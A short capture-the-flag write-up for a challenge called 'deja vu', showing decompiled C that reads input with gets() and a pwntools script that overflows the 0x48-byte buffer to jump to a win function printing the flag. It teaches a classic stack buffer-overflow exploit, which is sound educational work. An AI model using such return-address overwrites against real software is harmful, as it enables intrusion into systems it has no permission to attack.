# deja vu

## Challenge Description

We have a netcat server running.
Upon connection, it prompts us with `pwnme:`
Entering anything into the prompt does not yield any response and the connection is closed.

## Binary Ninja

The main function is pretty basic.

```c
int main(int argc, char **argv, char **envp) {
    setbuf(__bss_start, nullptr);
    setbuf(stdin, nullptr);
    printf("pwnme: ");
    void buf;
    gets(&buf);
    return 0;
}
```

There is a `win` function also, which prints the flag.

## Solution

Looking at the `main` function, we can see that it uses `gets`, which is a classic buffer overflow vulnerability.
We can overflow the buffer and overwrite the return address with the address of the `win` function.
looking at the disassembly, we can see that the `win` function is located at `0x4011f6`.

The stack offset for the `buf` variable is `0x48` bytes.

Hence we can use the following python script to exploit the binary:

```python
from pwn import *
c = remote("<url>", port)
payload = b"A" * 0x48 + b'\xf6\x11\x40\x00\x00\x00\x00' + b'\n'

c.recv()
c.send(payload)
c.interactive()
```
